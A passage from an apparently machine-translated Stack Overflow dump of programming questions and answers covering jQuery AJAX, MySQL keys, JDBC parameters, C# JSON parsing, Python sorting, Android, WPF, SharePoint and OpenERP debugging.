            $("#messageBox").text(string);
    },
    error: function (xhr, status, thrownError) {
        var string;
        if (window.ActiveXObject){
            string = thrownError.xml;
        }
        else
        {
            string = (new XMLSerializer()).serializeToString(thrownError);

        }
            $("#messageBox").text(string);
  }
});
} 
```

现在，当请求成功时，会显示消息，但是当我收到错误时，不会显示内容。我究竟做错了什么？

编辑：有人建议我在控制台中打印所有三个参数，所以我发现实际上 xhr 参数包含我需要的内容。**现在的问题是，如果我尝试创建警报（xhr.responseText），警报窗口包含所需的消息，但是如果我想在 div 中显示相同的内容，则什么也不会发生，我希望它显示在那里.**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:44:36.363

问题是我试图将一个字符串序列化为字符串，因为 xhr.responseText 是一个字符串。要解决这个问题，应该是xhr.responseXML，而不是xhr.responseText。这是代码：

```
function getBookByIsbn() {

if($("#getAndDeleteIsbn").val() == '')
{
    alert("Please provide the ISBN");
    return false;
}
$.ajax({
    dataType: 'xml',
    type: 'GET',
    url: 'http://localhost:8080/library/books/' + $("#getAndDeleteIsbn").val(),
    success: function (data) {
        var string;
        if (window.ActiveXObject){
            string = data.xml;
        }
        else
        {
            string = (new XMLSerializer()).serializeToString(data);
        }
            $("#messageBox").text(string);
    },
    error: function (xhr, status, thrownError) {
        var string;
        if (window.ActiveXObject){
            string = xhr.responseXML.xml;
        }
        else
        {
            string = (new XMLSerializer()).serializeToString(xhr.responseXML);

        }
            $("#messageBox").text(string);
  }
});
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:14:30.880

服务器并从服务器获得响应我也得到了同样的东西。您只需要检查它的错误或响应。为此，您可以使用 javascript xquery 或使用。

```
 //suppose you get response in variable 'xml_response'.
 var res = xml_response.getElementByTagName('errorMessage');
 //if result exist then it is error other wise it is not error.
 if ( res[0] ){
  alert ( 'error occur on server side. ');
  return;
 }else{
 //show you record in div.
 } 
```

# mysql - 在一个表中有 2 个 ID 很奇怪吗？

> ID：13703604
> 
> 赞同：0
> 
> 时间：2012-12-04T13:02:44.867
> 
> 标签：mysql

我的情况是，我有一些来自 prev 开发人员的表格，包含`id`和`name`. 不是自动递增的`id`（值类似于 A0001）并且也可以更改。我不知道这个可变ID背后的原因或原因。

我只是想知道如果一个表有 2 个 ID 怎么办？我考虑将当前 id 设置为“唯一代码”并添加 1 个字段，称为 id，即自动增量和修复字段。所以，我需要对这个想法进行一些考虑。我仍然对在一个表中有 2 个 ID 感到“奇怪”>.<

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:05:43.653

是的，一个表可以有多个键。将自动增量列作为主键，将可变字段作为键，其中将包含唯一值

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:05:49.410

您可能不得不放弃现有的“id”是id，而是标签的想法。现在您可以添加一个真正的自动递增 'id' 并使用它来标识表中的元组。

但是，我会保持“标签”的唯一性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:05:03.653

不，这并不奇怪。您可以认为单个 ID 是它们两者的串联。

# java - 如何在jdbc命名参数中输入日期

> ID：13703608
> 
> 赞同：0
> 
> 时间：2012-12-04T13:03:08.277
> 
> 标签：java, jdbctemplate, named-parameters

我有以下代码：

```
conditions.add("mydate = str_to_date('"+date_from_user+"', '%Y-%m-%d')"); 
```

以上工作正常，但由于我从用户那里获取输入并将其推到我的查询中，我冒着查询安全的风险。所以我想使用命名模板，所以我将代码更改为：

```
conditions.add("mydate = str_to_date(':mydate', '%Y-%m-%d')");
namedParams.put("mydate", date_from_user); 
```

但是，上面的代码不起作用并产生以下错误消息：

```
<SQLWarning ignored: SQL state 'HY000', error code '1411', message [Incorrect datetime value: ':mydate' for function str_to_date]> 
```

所以似乎namedparameter没有获取价值..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T05:06:53.513

您是否尝试过删除引号`':mydate'`并将其更改如下，

```
conditions.add("mydate = str_to_date(:mydate, '%Y-%m-%d')");
namedParams.put("mydate", date_from_user); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T05:38:31.000

首先检查您的数据库服务器日期格式。然后以相同的格式输入。以相同的对象创建您的日期对象或以相同的格式传递字符串。

# c# - 如何使用 JSON 解析来自谷歌地图 API 的响应？

> ID：13703609
> 
> 赞同：4
> 
> 时间：2012-12-04T13:03:10.773
> 
> 标签：c#, json, google-maps

我想用谷歌地图距离矩阵 API 计算 C# 中点之间的距离。

我使用以下代码发出请求：

```
private void MapsAPICall()
    {
        //Pass request to google api with orgin and destination details
        HttpWebRequest request =
            (HttpWebRequest)WebRequest.Create("http://maps.googleapis.com/maps/api/distancematrix/json?origins="
            + "51.123959,3.326682" + "&destinations=" + "51.158089,4.145267" 
            + "&mode=Car&language=us-en&sensor=false");

        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        using (var streamReader = new StreamReader(response.GetResponseStream()))
        {
            var result = streamReader.ReadToEnd();

            if (!string.IsNullOrEmpty(result))
            {
                Distance t = JsonConvert.DeserializeObject<Distance>(result);
            }
        }
    } 
```

然后我想将 json 答案解析为 Distance 类：

```
public struct Distance
{
   // Here I want to parse the distance and duration
} 
```

这是我收到的 json 响应示例： [http ://maps.googleapis.com/maps/api/distancematrix/json?origins=Vancouver+BC&destinations=San+Francisco&mode=bicycling&language=fr-FR&sensor=false](http://maps.googleapis.com/maps/api/distancematrix/json?origins=Vancouver+BC&destinations=San+Francisco&mode=bicycling&language=fr-FR&sensor=false)

如何将距离和持续时间解析为距离类？
这是我第一次使用 Json，所以我没有经验。

Ps：我已经安装了 json.net 库。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:10:08.853

[Web Essentials](http://visualstudiogallery.msdn.microsoft.com/6ed4c78f-a23e-49ad-b5fd-369af0c2107f)有一个“将 JSON 粘贴为类”的选项。这将生成反序列化 JSON 所需的类。

使用此选项将为您生成以下内容：

```
public class Distance
{
    public string text { get; set; }
    public int value { get; set; }
}

public class Duration
{
    public string text { get; set; }
    public int value { get; set; }
}

public class Element
{
    public Distance distance { get; set; }
    public Duration duration { get; set; }
    public string status { get; set; }
}

public class Row
{
    public Element[] elements { get; set; }
}

public class Parent
{
    public string[] destination_addresses { get; set; }
    public string[] origin_addresses { get; set; }
    public Row[] rows { get; set; }
    public string status { get; set; }
} 
```

*（如果需要，您可以重构生成的代码以使其更具可读性。您需要添加 Json.NET 属性以确保序列化仍然有效）*

然后在您的代码中，您可以使用以下行来反序列化您的代码：

```
Parent result = JsonConvert.DeserializeObject<Parent>(json); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-01-27T14:02:51.373

**Visual Studio 2015+ 更新**

作为对 Wouter de Kort 的[有用答案](https://stackoverflow.com/a/13703738/3180489)的补充，这里是 Visual Studio 2015+ 的更新。

Visual Studio 2015+ 具有 Wouter 描述的方便的“将*JSON 粘贴为类*”。

*要自己*生成 GoogleMaps API JSON 反序列化所需的类：

1.  在 Web 浏览器或 REST 客户端中，导航到填充了一些测试参数的 GoogleMaps API URL。例如：`https://maps.googleapis.com/maps/api/distancematrix/json?origins=30.3449153,-81.860543&destinations=33.7676932,-84.4906437&language=en-US&units=imperial&key=<API_KEY>`
2.  `Ctrl+C`将生成的原始 JSON 响应从浏览器/客户端复制 ( ) 到剪贴板。
3.  在 Visual Studio 2015+ 中，打开要`.cs`在其中创建类的文件。
4.  将光标放在`.cs`您希望生成类的文件中。
5.  从 Visual Studio 的菜单中选择*Edit > Paste Special > Paste JSON as Classes*

**结果类的示例**

```
public class Rootobject
{
    public string[] destination_addresses { get; set; }
    public string[] origin_addresses { get; set; }
    public Row[] rows { get; set; }
    public string status { get; set; }
}

public class Row
{
    public Element[] elements { get; set; }
}

public class Element
{
    public Distance distance { get; set; }
    public Duration duration { get; set; }
    public string status { get; set; }
}

public class Distance
{
    public string text { get; set; }
    public int value { get; set; }
}

public class Duration
{
    public string text { get; set; }
    public int value { get; set; }
} 
```

从那时起，您可以遵循 Wouter 的其他建议。

```
Rootobject result = JsonConvert.DeserializeObject<Rootobject>(json); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-22T12:39:32.433

已经晚了，但可能对某人有用。在这种情况下，我们有一个 JSON 字符串并希望有一个适当的类结构来正确反序列化它，您可以使用在线工具[http://json2csharp.com/](http://json2csharp.com/)

只需粘贴您的 JSON 字符串并单击“*生成*”按钮。它将为您提供所需的类结构。就是这么简单。当您想避免安装外部工具时，这种方法很有用。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-04T13:09:55.450

“距离”类型需要正确建模 JSON 模式，例如：

```
public string[] destination_addresses { get; set; }
public string[] origin_addresses { get; set; }
public Row[] rows { get; set; }
public string status { get; set; } 
```

（当然，像这样的子类型`Row`也需要建模）

除此之外，您对 Json.Net 的使用：

```
Distance t = JsonConvert.DeserializeObject<Distance>(result); 
```

应该可以

# python - 根据另一个数组对数组进行排序

> ID：13703612
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:03:17.667
> 
> 标签：python

我有两个清单

A=[5,2,3,4,1]

B=[3,1,5]

我想使用 A 对 B 进行排序，以便输出反映：[5,3,1]

我该如何实施？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T13:05:46.833

你可以使用......但一切都取决于你所追求的 - 还有其他方法......

```
>>> a = [5, 2, 3, 4, 1]
>>> b=  [3, 1, 5]
>>> sorted(b, key=a.index)
[5, 3, 1] 
```

或者正如@Manan 指出的那样-您可以使用就地排序`a.sort(...)`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T13:05:58.693

对于就地排序，这应该这样做：

```
B.sort(key=A.index) 
```

否则你可以这样做（根据乔恩克莱门茨......）：

```
BSorted = B.sorted(key=A.index) 
```

这是如何工作的：

参数是一个函数（在`key`这里使用 lambdas 很常见......）该列表根据函数的输出进行排序。下面的例子说明了：

```
A = [{'a':100,'b':10},{'a':56,'b':100},{'a':90,'b':90}]
A.sort(key=lambda x:x['a']) 
print(A)
A.sort(key=lambda x:x['b']) 
print(A) 
```

这输出：

```
[{'a':56,'b':100},{'a':90,'b':90},{'a':100,'b':10}]
[{'a':100,'b':10},{'a':90,'b':90},{'a':56,'b':100}] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:47:14.810

如果我对您的问题的理解是正确的，您需要执行以下操作：

```
A = [5,2,3,4,1]
B = [3,1,5]
C = []
for i in range(len(A)):
    if A[i] in B:
        C += [A[i]]

print C # [5, 3, 1] 
```

希望这可以帮助。

# jquery - 三个json请求，想全局存储，加在一起

> ID：13703613
> 
> 赞同：0
> 
> 时间：2012-12-04T13:03:24.790
> 
> 标签：jquery, json

我有 3 个获取数据的 json 请求，我想存储结果并将它们加在一起？我已经尝试过了，但我得到了 NaN，因为它们被设置为 null。我究竟做错了什么？

```
var twitter, facebook, web, total_count;

    // grab from facebook
    var facebook = $.getJSON('https://graph.facebook.com/'+f_page+'?callback=?', function(data) {
        var fb_count = data['likes'].toString();
        fb_count = add_commas(fb_count);
        $('#fb_count').html(fb_count);
    });

    // grab from twitter
    var twitter = $.getJSON('http://api.twitter.com/1/users/show.json?screen_name='+t_page+'&callback=?', function(data) {
        twit_count = data['followers_count'].toString();
        twit_count = add_commas(twit_count);
        $('#twitter_count').html(twit_count);
    });

    // grab from website
    var web = $.getJSON('json.php', function(data) {
        web_count = data['count'].toString();
        web_count = add_commas(web_count);
        $('#website_count').html(web_count);
    });

    $.when(facebook, twitter, web).done( countTotal );

    function countTotal() {
        total_count = facebook + twitter + web;
        total_count = add_commas(total_count);
        $('#count_total').html(total_count);
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:07:15.070

您正在尝试访问异步加载的数据。这意味着当程序代码到达这一行时：

```
total_count = fb_count + twit_count + web_count; 
```

数据还没有。

您需要等到数据准备好：

```
var fb_count, twit_count, web_count, total_count;

var first = $.getJSON( /* code1 */);
var second = $.getJSON( /* code2 */);
var third = $.getJSON( /* code3 */);

$.when(first, second, third).done( doYourMath );

function doYourMath() {
    total_count = fb_count + twit_count + web_count;
    total_count = add_commas(total_count);
    $('#count_total').html(total_count);
} 
```

PS：
确保在某处将 total_count 定义为变量（var total_count），否则会污染全局范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:07:00.537

您需要等到所有 ajax 调用返回值。只有在此之后，您才应该尝试添加数字。

# javascript - Finishing an algorithm to generate a color dominance histogram from a picture (in JavaScript)

> ID：13703618
> 
> 赞同：2
> 
> 时间：2012-12-04T13:03:42.533
> 
> 标签：javascript, image, colors, palette

I need to find out what are the N dominant colors of an image. I've written a function inspired from this : [http://bubble.ro/How_to_create_the_histogram_of_an_image_using_PHP.html](http://bubble.ro/How_to_create_the_histogram_of_an_image_using_PHP.html)

The picture is drawn inside of a hidden canvas that has the same surface as the picture.

Here is my code :

```
lwf.image.getDominantColors = function(args) {

    // args.imageData is the ImageData object got from the canvas 2d context.
    // canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height)

    if(!args.imageData) alert('lwf::image::getDominantColors() : no ImageData provided.');

    // args.sampling defines the percentage of pixels to be tested (0.01 for example).

    var sampling = undefined != args.sampling && 0 > args.sampling && args.sampling <= 1
      ? args.sampling
      : lwf.image.DFLT_PX_SAMPLING_RATIO; // Default value

    var w = args.imageData.width,
        h = args.imageData.height,
        total = w * h,
        mat = args.imageData.data;

    // Interval allows me to skip pixels on X and Y axis to make the computation faster.
    // The top-left pixel of each interval * interval square is tested.

    var interval = Math.round(Math.sqrt(1 / sampling));

    var histogram = new Array();

    var x = 0, y = 0, // Coordinates of the tested pixel.
        i = 0, j = 0; // Use to get the number of tested pixels.

    for(i = 0, x = 0; x < w; ++i, x += interval) {

        for(j = 0, y = 0; y < h; ++j, y += interval) {

            var start = (y * w + x) << 2;

            var r = mat[start    ],
                g = mat[start + 1],
                b = mat[start + 2];

            var value = Math.round((r + g + b) / 3);

            // TODO
        }
    }

    var tested = i * j;

    // TODO

    return histogram;

}; // lwf::image::getDominantColors() 
```

I don't know how to complete this so that it returns an equivalent of a PHP array indicating, foreach color that was found, a value representing its presence.

And another question : what does the following expression represent ?

```
var value = Math.round((r + g + b) / 3); 
```

It's strange because if we have r = 200, g = 100, b = 100 and r = 100, g = 100, b = 200, both will have the same value but for two different colors. There's no explaination about this in the tutorial i found.

Does anyone have an idea ? Thanks in advance :)

# wpf - Pixel-perfect 'nearest neighbor' scaling

> ID：13703626
> 
> 赞同：2
> 
> 时间：2012-12-04T13:04:05.260
> 
> 标签：wpf, image, xaml, nearest-neighbor

I have an [Image](http://msdn.microsoft.com/en-us/library/system.windows.controls.image.aspx) as shown below. When zooming in (enlarging the image), I want to **preserve the pixels as much as possible**. Hence, interpolation should be avoided. E.g. Zooming 1700% implies a solid 17x17 pixel area for each and every pixel. (I understand this becomes problematic for values like 1730%.)

```
<Image Stretch="Uniform" Source="C:\test.png"
       <!-- 4 important values -->
       SnapsToDevicePixels="True"
       UseLayoutRounding="True"
       RenderOptions.EdgeMode="Aliased"
       RenderOptions.BitmapScalingMode="NearestNeighbor"/> 
```

**Q:** What combination of these four settings is the best in this case?

# sharepoint - 将 SharePoint 流量从一台服务器切换到另一台服务器

> ID：13703627
> 
> 赞同：0
> 
> 时间：2012-12-04T13:04:04.920
> 
> 标签：sharepoint

对于部署，我希望能够在不添加额外硬件的情况下将流量从一个前端快速移动到另一个前端。如何才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T19:16:05.800

我会考虑使用负载平衡器。在正常状态下，您可以让负载均衡器决定使用哪个前端。当您想部署到前端 1 时，您可以将所有流量派生到前端 2。然后，当部署前端 1 时，您可以对前端 2 执行相同的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T20:58:30.027

没有负载均衡器就无法“快速”完成。或者，更慢的是更新站点的 DNS 以指向另一个 Web 前端。高温高压

# java - 在 Android 中显示类似选取框的滚动文本

> ID：13703629
> 
> 赞同：4
> 
> 时间：2012-12-04T13:04:12.190
> 
> 标签：java, android, opengl-es, android-canvas

我正在开发 Android 应用程序，其主要目的是在底部显示 CNN 突发新闻样式栏和一些图片。我创建了两个自定义视图，一个用于显示照片，第二个用于显示栏。它在指定的时间内一次显示一张图片，并将当前图片与队列中的下一张交换。

为了使底部栏中的文本动画化，我使用了画布、onDraw() 和 handler.postDelayed。该解决方案的结果很差。文本移动不流畅，尤其是在交换图像时。

我应该用什么代替画布？是否有任何基于 OpenGL 的库可以使这项任务相对轻松？我尝试使用 AndEngine，但它缺乏文档和线程问题使我不再使用它。

```
public class Infobar extends View {

    private List<Message> messages;

    private Handler handler;

    private Paint boxPaint;
    private Paint defaultTextPaint;
    private Paint importantTextPaint;

    private long offset = 0;
    private long maxOffset = 1000;
    private int textWidth = 1000;
    private int textHeight = 50;

    private int measuredWidth;
    private int measuredHeight;

    private Runnable animateRunnable = new Runnable() {
        public void run() {
            animateMessage();
        }
    };

    long startTime = new Date().getTime();

    private int backgroundCol = Color.parseColor("#ffff00");
    private int textColor = Color.parseColor("#000000");

    private static final int FRAME_DELAY = 10;
    private static final int FRAME_SHIFT    = 3;

    private static final int EMPTY_SPACE = 2;
    private static final String SEPARATOR = "  ✩  ";

    private static final int TEXT_SIZE = 35;

    public Infobar(Context context, AttributeSet attrs) {
        super(context, attrs);

        handler = new Handler();
        messages = new ArrayList<Message>();

        boxPaint = new Paint();

        defaultTextPaint = new Paint();
        defaultTextPaint.setColor(getResources().getColor(R.color.info_bar_default_text_color));

        importantTextPaint = new Paint();
        importantTextPaint.setColor(getResources().getColor(R.color.info_bar_important_text_color));

        handler.postDelayed(animateRunnable, FRAME_DELAY);

    }

    public void setMessagesList(List<Message> list) {
        messages = list;
    }

    public void setBackgroundColor(String color) {
        backgroundCol = Color.parseColor(color);
    }

    public void setTextColor(String color) {
        textColor = Color.parseColor(color);
    }

    public List<Message> getMessagesList() {
        return messages;
    }

    private String getMessagesString() {
        StringBuilder builder = new StringBuilder();
        for(Message message : messages) {
            builder.append(message.content);
            if(messages.indexOf(message) != (messages.size() - 1)) {
                builder.append(SEPARATOR);
            }
        }
        return builder.toString();
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {

        super.onMeasure(widthMeasureSpec, heightMeasureSpec);   
        measuredWidth = getMeasuredWidth();
        measuredHeight = getMeasuredHeight();

    }

    @Override
    protected void onDraw(Canvas canvas) {

        drawBackground(canvas, false);
        drawMessage(canvas, getMessagesString());

        super.onDraw(canvas);
    }

    private void drawBackground(Canvas canvas, boolean important) {

        boxPaint.setColor(backgroundCol) ;

        canvas.drawRect(0, 0, measuredWidth, measuredHeight, boxPaint);
    }

    private void drawMessage(Canvas canvas, String message) {
        defaultTextPaint.setTextSize(TEXT_SIZE);

        Rect bounds = new Rect();
        defaultTextPaint.getTextBounds(message, 0, message.length(), bounds);
        defaultTextPaint.setColor(textColor);

        textWidth = bounds.width();
        textHeight = bounds.height();

        int positionX = measuredWidth - (int)offset;
        int positionY = measuredHeight - textHeight/2;      

        if(offset  > (measuredWidth + textWidth)) {
            offset = 0;
            positionX = measuredWidth;
        }

        canvas.drawText(message, positionX, positionY, defaultTextPaint);
    }

    private void animateMessage() {
        offset += FRAME_SHIFT; 
        //offset = Math.round((new Date().getTime() - startTime) * 0.2) % (measuredWidth + textWidth);
        invalidate();
        handler.removeCallbacks(animateRunnable);
        handler.postDelayed(animateRunnable, FRAME_DELAY);
    }

} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T17:46:40.530

除非有特殊原因，可以使用 TextView 内置的跑马灯功能：

```
<LinearLayout>
<TextView
    android:id="@+id/myText"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:lines="1"
    android:ellipsize="marquee"
    android:fadingEdge="horizontal"
    android:marqueeRepeatLimit="marquee_forever"
    android:scrollHorizontally="true"
    android:focusable="true"
    android:focusableInTouchMode="true"
    android:text="Your long text goes here. You can also change it programmatically" />
</LinearLayout> 
```

然后在活动代码中：

```
TextView myText=(TextView) findViewById(R.id.myText);
myText.setSelected(true); //needs this to work 
```

# jquery - jquery fancybox 2 iframe send data to parent via post

> ID：13703632
> 
> 赞同：0
> 
> 时间：2012-12-04T13:04:13.293
> 
> 标签：jquery, django, iframe, fancybox

I need to pass data from fancybox iframe to my django view using post. I set the iframe title as "a href" link that the user can click on.

this is the code for the fancybox:

```
 $(".fancybox-company").fancybox({
    width       : '75%',
    height      : '75%',
    autoSize    : false,
    closeClick  : false,
    fitToView   : false,
    openEffect  : 'none',
    closeEffect : 'none',
    type : 'iframe',
    beforeLoad: function() {
        var id = $(this.element).data('company-id');
        this.title = "<a href=\"\" id=company-iframe>Add to your list</a>";
    }
}); 
```

and this is the code that listens on click events:

```
$( ".company-iframe" ).on( 'click', function ( event ) {

    event.preventDefault();

    var id = event.target.href;

    $.post( "/company/selection", { id : id }, function ( json ) {

      // ...

    } ); 
```

this is not being called, i need to pass the click event from the iframe to the parent and pass the company id as input.

what am i missing?

10x

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T16:10:55.290

我认为您缺少 csrf 令牌。这是一种[django 机制](https://docs.djangoproject.com/en/dev/ref/contrib/csrf/)，用于防止跨站点请求伪造。如果您在中间件类中启用了 csrf，而不是在每个发布请求中，您必须在数据中提供“csrfmiddlewaretoken”。您可以使用 {% csrf_token %} 标签从 cookie 或直接在模板中访问它。

在模板中实现此标记后，您需要修改 js 函数，例如

```
$( ".company-iframe" ).on( 'click', function ( event ) {

    event.preventDefault();

    var csrfmiddlewaretoken = $('input[name=\"csrfmiddlewaretoken\"]').val();
    var id = event.target.href;

    $.post( "/company/selection", 
             { id : id , csrfmiddlewaretoken: csrfmiddlewaretoken},
             function ( json ) {

      // ...

    } ); 
```

# c# - c# IEnumerable double iteration

> ID：13703637
> 
> 赞同：5
> 
> 时间：2012-12-04T13:04:24.610
> 
> 标签：c#, ienumerable

This is out of curiosity I want to ask this question...

Here is my code:

```
for (int i = 0; i < myList.Count - 1; ++i)
{
    for (int j = i+1; j < myList.Count; ++j)
    {
        DoMyStuff(myList[i], myList[j]);
    }
} 
```

Pretty simple loop, but obviously it only works with List... But I was wondering... how can I code this loop in order to make it independent of the collection's type (deriving from IEnumerable...) My first thought:

```
IEnumerator it1 = myList.GetEnumerator();
while (it1.MoveNext())
{
    IEnumerator it2 = it1; // this part is obviously wrong
    while (it2.MoveNext())
    {
        DoMyStuff(it1.Current, it2.Current);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:09:41.970

因为枚举器没有获取第 n 个元素的有效方法，所以最好的办法是将可枚举复制到列表中，然后使用现有代码：

```
void CrossMap<T>(IEnumerable<T> enumerable)
{
    List<T> myList = enumerable.ToList();

    for (int i = 0; i < myList.Count - 1; ++i)
    {
        for (int j = i+1; j < myList.Count; ++j)
        {
            DoMyStuff(myList[i], myList[j]);
        }
    }
} 
```

但是，您可以对某些集合类型进行相当巧妙的破解。因为 BCL 中某些集合类型的枚举器被声明为值类型，而不是引用类型，所以您可以通过将枚举器的状态复制到另一个变量来创建它的隐式克隆：

```
// notice the struct constraint!
void CrossMap<TEnum, T>(TEnum enumerator) where TEnum : struct, IEnumerator<T>
{
    while (enumerator.MoveNext())
    {
        TEnum enum2 = enumerator;    // value type, so this makes an implicit clone!
        while (enum2.MoveNext())
        {
            DoMyStuff(enumerator.Current, enum2.Current);
        }
    }
}

// to use (you have to specify the type args exactly)
List<int> list = Enumerable.Range(0, 10).ToList();
CrossMap<List<int>.Enumerator, int>(list.GetEnumerator()); 
```

这是相当迟钝的，而且很难使用，所以你应该只在性能和空间关键的情况下这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:34:30.273

这是一种真正使用惰性范式从单个输入`IEnumerable`生成非重复组合流的方法。`IEnumerable`第一对将立即返回（不缓存列表），但在操作期间会增加延迟（除了非常高的 n 值或非常昂贵`IEnumerable`的 s 外，仍然难以察觉），`Skip(n)`这发生在外部枚举器上的每次向前移动之后：

```
public static IEnumerable<Tuple<T, T>> Combinate<T>(this IEnumerable<T> enumerable) {
    var outer = enumerable.GetEnumerator();
    var n = 1;
    while (outer.MoveNext()) {
        foreach (var item in enumerable.Skip(n))
            yield return Tuple.Create(outer.Current, item);
        n++;
    }
} 
```

以下是在您的情况下如何使用它：

```
foreach(var pair in mySource.Combinate())
    DoMyStuff(pair.Item1, pair.Item2); 
```

**后记**

每个人都指出（在这里和其他地方）没有有效的方法来获取一个`IEnumerable`. 这部分是因为`IEnumerable`甚至不需要底层源集合。例如，这是一个愚蠢的小函数，它可以尽快为实验动态生成值，并持续指定的*时间段*而不是任何计数：

```
public static IEnumerable<double> Sample(double milliseconds, Func<double> generator) {
    var sw = new Stopwatch();
    var timeout = TimeSpan.FromMilliseconds(milliseconds);
    sw.Start();
    while (sw.Elapsed < timeout)
        yield return generator();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:06:52.097

有扩展方法`Count()`，并且`ElementAt(int)`在`IEnumerable<T>`. 它们在`System.Linq`命名空间中声明，如果您使用的任何 C# 版本高于 C# 3，则默认情况下应将其包含在您的 .cs 文件中。这意味着您可以这样做：

```
for (int i = 0; i < myList.Count() - 1; ++i)
{
  for (int j = i+1; j < myList.Count(); ++j)
  {
    DoMyStuff(myList.ElementAt(i), myList.ElementAt(j));
  }
} 
```

但是，请注意，这些是方法，将在迭代过程中一遍又一遍地调用，因此您可能希望将它们的结果保存到变量中，例如：

```
var elementCount = myList.Count();
for (int i = 0; i < elementCount - 1; ++i)
{
  var iElement = myList.ElementAt(i);
  for (int j = i+1; j < elementCount; ++j)
  {
    DoMyStuff(iElement, myList.ElementAt(j));
  }
} 
```

您还可以尝试一些 LINQ，它将选择所有符合条件的元素对，然后使用 simple`foreach`调用处理，例如：

```
var result = myList.SelectMany((avalue, aindex) => 
               myList.Where((bvalue, bindex) => aindex < bindex)
                     .Select(bvalue => new {First = avalue, Second = bvalue}));

foreach (var item in result)
{
  DoMyStuff(item.First, item.Second);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:33:35.410

效率不高，但可读：

```
int i = 0;
foreach( var item1 in myList)
{
    ++i;
    foreach( var item2 in myList.Skip(i))
        DoMyStuff(item1, item2);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:13:45.637

我会写信`IEnumerable<T>`并传递索引操作的委托：

```
public static void DoStuff<T>(IEnumerable<T> seq, Func<int, T> selector)
{
    int count = seq.Count();
    for (int i = 0; i < count - 1; ++i)
    {
        for (int j = i+1; j < count; ++j)
        {
            DoMyStuff(selector(i), selector(j));
        }
    }
} 
```

您可以使用以下方法调用它：

```
List<T> list = //whatever
DoStuff(list, i => list[i]); 
```

如果将集合参数限制为`ICollection<T>`可以使用`Count`属性而不是使用`Count()`扩展方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T13:35:33.710

您可以使用 IEnumerable.Skip() 相当简洁地做到这一点，如果列表足够短，它甚至可能与将列表复制到数组中相比相当快。不过，它肯定比复制足够大小的列表要慢得多。

您必须对各种大小的列表进行一些计时，以查看在哪里复制到数组变得更有效。

这是代码。请注意，它迭代了一个可枚举的对象两次——如果该可枚举对象被正确实现，那就没问题了！

```
static void test(IEnumerable<int> myList)
{
    int n = 0;

    foreach (int v1 in myList)
    {
        foreach (int v2 in myList.Skip(++n))
        {
            DoMyStuff(v1, v2);
        }
    }
} 
```

# c# - Web 服务何时加载它使用的外部 dll？

> ID：13703639
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:04:28.690
> 
> 标签：c#, web-services, pinvoke

我有一个通过 pinvoke 使用外部 dll 的 Web 服务。我的问题是，何时加载外部 dll - Web 服务何时启动或仅在调用它的服务合同被调用时？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:11:54.527

非托管 DLL 在首次使用时被加载。

这与您的程序使用的托管程序集的行为相同。

# openerp - Debugging in OpenERP 7.0

> ID：13703644
> 
> 赞同：7
> 
> 时间：2012-12-04T13:04:48.690
> 
> 标签：openerp, odoo

How to do debug in OpenERP v7?

In previous versions of OpenERP, it was easy to debug. But in the latest version it's tough to debug.

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-04T13:32:02.687

要在 eclipse 中调试 OpenERP+python 代码，请在调试透视图中启动 eclipse（仅限 helios/indigo）并按照给定的步骤操作：

1：按“ctr+c”停止你的openERP运行服务器。

2：在 Eclipse 中，转到菜单“运行/调试配置”。在“Python Run”下的配置窗口中，创建新的调试配置（双击“Python Run”）。

3：创建新的调试配置后，请按照给定的步骤操作：

3.1：在“项目”下的“主”选项卡中，从工作区中选择“服务器”项目或文件夹（Openerp Server 所在的文件夹）。

3.2：在“主模块”下写入“openerp-server”的位置。

```
Ex: ${workspace_loc:server/openerp-server}. 
```

3.3：在“程序参数”下的“参数”选项卡中，单击“变量”按钮，将出现新窗口。

3.4：然后单击“编辑变量”按钮创建新的“变量”，将出现新窗口。

3.5：按下“新建”按钮并将您的插件路径作为值。

```
Ex: --addons ../addons,../your_module_path 
```

3.6：在所有打开的窗口中按确定，然后“应用”。

4：现在进入“PyDev Package Explorer”视图，转到 6.1/server 并右键单击“openerp-server”文件，选择“Debug As --> Python Run”。

5：现在在“控制台”中你可以看到你的服务器已经启动了。

6：现在打开您要调试的 .py 文件并设置断点。

7：现在从'gtk'或'web-client'开始你的模块表单，当执行到达断点时执行将停止。

8：现在通过按“F5、F6、F7”来调试您的代码，您可以看到变量的值。

